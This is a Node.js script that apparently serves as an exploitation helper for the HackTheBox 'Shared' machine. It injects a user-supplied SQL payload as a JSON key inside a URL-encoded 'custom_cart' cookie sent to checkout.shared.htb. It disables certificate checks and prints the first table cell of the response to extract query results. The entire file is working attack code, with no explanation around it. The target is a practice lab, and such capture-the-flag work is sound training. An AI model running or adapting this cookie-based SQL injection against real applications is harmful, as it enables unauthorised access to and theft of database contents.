#!/usr/bin/env node

const https = require('https')

const options = { hostname: '10.10.11.172', rejectUnauthorized: false }

const parseBody = body => body.match(/<td>([\s\S]*?)<\/td>/)[1]

const sqli = payload => {
	payload = encodeURIComponent(JSON.stringify({ [payload]: 1 }))

	const headers = {
		Cookie: `custom_cart=${payload}`,
		Host: 'checkout.shared.htb'
	}

	const req = https.request({...options, headers}, res => {
		let body = ''

  	res.on('data', data => (body += data))
  	res.on('end', () => console.log(parseBody(body)))
	})

	req.on('error', console.error)
	req.end()
}

if (process.argv.length !== 3) {
	console.error('Usage: node sqli.js "<sqli-payload>"')
	process.exit(1)
}

sqli(process.argv[2])
